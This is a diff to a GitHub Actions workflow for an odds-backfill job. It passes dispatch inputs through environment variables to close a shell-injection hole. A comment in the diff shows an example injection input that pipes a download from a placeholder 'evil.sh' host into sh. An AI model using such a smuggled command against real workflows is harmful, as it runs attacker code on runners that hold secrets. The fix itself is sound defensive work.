@@ -63,14 +63,23 @@ jobs:
           ODDS_API_KEY:         ${{ secrets.ODDS_API_KEY }}
           SUPABASE_URL:         ${{ secrets.SUPABASE_URL }}
           SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
+          # Pass dispatch inputs through the environment instead of interpolating ${{ }} straight into
+          # the shell: with direct interpolation the value is pasted in as script text before bash runs,
+          # so an input like `x"; curl evil.sh | sh; #` executes. As env vars they're only ever data.
+          IN_MODE:        ${{ inputs.mode }}
+          IN_NO_PROPS:    ${{ inputs.no_props }}
+          IN_SEASON:      ${{ inputs.season }}
+          IN_WEEKS:       ${{ inputs.weeks }}
+          IN_OFFSETS:     ${{ inputs.offsets }}
+          IN_MAX_CREDITS: ${{ inputs.max_credits }}
         run: |
           FLAGS=""
-          if [ "${{ inputs.mode }}" = "write" ]; then FLAGS="$FLAGS --write"; fi
-          if [ "${{ inputs.no_props }}" = "true" ]; then FLAGS="$FLAGS --no-props"; fi
-          echo "Running: season=${{ inputs.season }} weeks=${{ inputs.weeks }} offsets=${{ inputs.offsets }} max-credits=${{ inputs.max_credits }} mode=${{ inputs.mode }} $FLAGS"
+          if [ "$IN_MODE" = "write" ]; then FLAGS="$FLAGS --write"; fi
+          if [ "$IN_NO_PROPS" = "true" ]; then FLAGS="$FLAGS --no-props"; fi
+          echo "Running: season=$IN_SEASON weeks=$IN_WEEKS offsets=$IN_OFFSETS max-credits=$IN_MAX_CREDITS mode=$IN_MODE $FLAGS"
           python backfill_odds.py \
-            --season "${{ inputs.season }}" \
-            --weeks "${{ inputs.weeks }}" \
-            --offsets "${{ inputs.offsets }}" \
-            --max-credits "${{ inputs.max_credits }}" \
+            --season "$IN_SEASON" \
+            --weeks "$IN_WEEKS" \
+            --offsets "$IN_OFFSETS" \
+            --max-credits "$IN_MAX_CREDITS" \
             $FLAGS
